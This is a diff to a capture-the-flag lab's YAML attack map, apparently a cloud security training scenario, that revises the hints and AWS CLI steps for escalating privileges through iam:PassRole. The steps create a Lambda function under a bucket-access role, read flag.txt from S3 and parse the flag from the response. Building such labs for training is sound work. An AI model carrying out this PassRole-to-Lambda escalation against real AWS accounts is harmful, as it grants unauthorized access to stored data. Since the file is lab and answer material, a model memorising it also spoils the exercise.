@@ -54,12 +54,12 @@ attackMap:
         written to read the flag object from the target S3 bucket and return its
         contents in the response body.
       hints:
-        - "Create a Lambda function using iam:PassRole (via the --role flag) to assign the bucket-access role as the execution role. Write a handler that uses the boto3 S3 client to read flag.txt from the target bucket and return the contents in the response body. Invoke the function with an empty payload and parse the flag from the returned body JSON."
+        - "Create a Lambda function using iam:PassRole (via the --role flag) to assign the bucket-access role as the execution role. Write a handler that uses the boto3 S3 client to read flag.txt from the target bucket -- take the bucket name from the target_bucket_name output on the Outputs tab, since the starting user cannot call s3api list-buckets -- and return the contents in the response body. Invoke the function with an empty payload and parse the flag from the returned body JSON."
         - "Browse to https://pathfinding.cloud/paths/lambda-001 for technique details."
       commands:
         - description: "Create a Lambda deployment package that reads the flag from the target S3 bucket"
           command: |
-            TARGET_BUCKET=$(aws s3api list-buckets --query "Buckets[?starts_with(Name, 'pl-prod-lambda-001-to-bucket-')].Name" --output text)
+            TARGET_BUCKET=<target_bucket_name output from the player's Outputs tab>
             cat > /tmp/lambda_function.py << EOF
             import json, boto3, os
             def lambda_handler(event, context):
@@ -71,7 +71,7 @@ attackMap:
             EOF
             cd /tmp && zip -q lambda_function.zip lambda_function.py
         - description: "Create the Lambda function with the bucket-access execution role"
-          command: "aws lambda create-function --function-name pl-lambda-001-to-bucket-extractor --runtime python3.11 --role arn:aws:iam::{account_id}:role/pl-prod-lambda-001-to-bucket-target-role --handler lambda_function.lambda_handler --zip-file fileb:///tmp/lambda_function.zip --timeout 30"
+          command: "ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text) && aws lambda create-function --function-name pl-lambda-001-to-bucket-extractor --runtime python3.11 --role arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-lambda-001-to-bucket-target-role --handler lambda_function.lambda_handler --zip-file fileb:///tmp/lambda_function.zip --timeout 30"
         - description: "Wait for the function to reach Active state"
           command: "aws lambda wait function-active --function-name pl-lambda-001-to-bucket-extractor"
 
@@ -89,5 +89,5 @@ attackMap:
           command: "aws lambda invoke --function-name pl-lambda-001-to-bucket-extractor --payload '{}' /tmp/response.json && cat /tmp/response.json | jq '.'"
         - description: "Parse and print the flag from the response body"
           command: "cat /tmp/response.json | jq -r '.body' | jq -r '.flag'"
-        - description: "Capture the CTF flag directly from S3 using the Lambda execution role's credentials (alternative)"
-          command: "aws s3 cp s3://pl-prod-lambda-001-to-bucket-{account_id}-{suffix}/flag.txt -"
+        - description: "Canonical S3 read of the flag object (denies for the starting user; the invoke response is the capture path)"
+          command: "aws s3 cp s3://${TARGET_BUCKET}/flag.txt -"
